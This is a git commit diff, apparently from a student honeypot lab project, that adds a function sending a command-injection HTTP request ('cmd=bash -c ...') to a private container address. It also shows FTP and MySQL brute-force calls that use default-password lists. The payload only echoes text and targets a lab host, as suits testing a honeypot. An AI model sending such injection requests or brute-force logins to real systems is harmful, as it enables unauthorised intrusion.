e1655669bed8a2c66b6dd83dd39a402e7d929e1b
pablo.franco.c <pablo.franco.c@estudiantat.upc.edu>
2024-04-28 17:36:59 +0200

    new http attack heralding

--- server/app/attack_scripts/attack_heralding.py
+++ server/app/attack_scripts/attack_heralding.py
@@ -1,5 +1,25 @@
 # scripts/attack_heralding.py
 
+import requests
+
+def simulate_bash_http_attack(dst_ip):
+    # Construir la URL con el parámetro que intenta ejecutar una shell bash
+    url = f"http://{dst_ip}:80/index.php?cmd=bash+-c+'echo+hello'"
+
+    try:
+        # Enviar la solicitud HTTP GET
+        response = requests.get(url)
+
+        # Comprobar si la solicitud fue exitosa y analizar la respuesta si es necesario
+        if response.status_code == 200:
+            print("Solicitud HTTP exitosa.")
+        else:
+            print("Error al enviar la solicitud HTTP.")
+
+    except requests.exceptions.RequestException as e:
+        print(f"Error al enviar la solicitud HTTP: {e}")
+
+
 import ftplib
 import traceback
 
@@ -42,7 +62,8 @@ def main():
     passw_list = ["admin", "root", "1234", "password"]
 
     # brute_force_ftp(host, 21, user_list, passw_list)
-    brute_force_mysql(host, 3306, user_list, passw_list)
+    #brute_force_mysql(host, 3306, user_list, passw_list)
+	simulate_bash_http_attack("172.18.0.2")
 
 if __name__ == "__main__":
     main()
